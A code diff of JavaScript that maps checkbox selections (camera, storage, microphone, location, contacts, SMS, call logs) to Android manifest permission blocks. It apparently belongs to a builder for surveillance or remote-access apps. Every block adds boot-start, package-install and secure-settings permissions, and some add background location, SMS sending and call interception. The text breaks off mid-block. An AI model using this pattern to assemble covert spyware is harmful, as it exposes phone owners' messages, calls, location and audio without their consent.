+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>        ` 
+        }
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>        ` 
+        }
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>        ` 
+        }
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+
+           ` 
+        }
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>        ` 
+        }
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        ` 
+        }
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>        ` 
+        }
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>        ` 
+        }
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>           ` 
+        }
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/> ` 
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>        ` 
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        ` 
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+
+           ` 
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>        ` 
+        }
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        ` 
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>        ` 
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        ` 
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        ` 
+        }
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+
+           ` 
+        }
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>        ` 
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        ` 
+        }
+
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+
+           ` 
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+
+           ` 
+        }
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
